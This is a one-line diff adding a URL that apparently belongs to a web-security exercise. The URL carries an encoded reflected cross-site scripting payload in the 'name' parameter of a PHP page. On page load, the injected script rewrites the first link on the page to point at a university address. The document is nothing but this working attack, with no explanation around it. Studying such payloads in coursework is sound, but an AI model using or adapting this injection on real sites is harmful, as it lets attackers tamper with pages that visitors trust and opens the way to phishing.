@@ -1,0 +1,1 @@
+http://permalink.co/multivac/biteme.php?name=%3Cscript%3Ewindow.onload%20=%20function%28%29%20{var%20link=document.getElementsByTagName%28%22a%22%29;link[0].href=%22http://www.ece.illinois.edu/%22;}%3C/script%3E
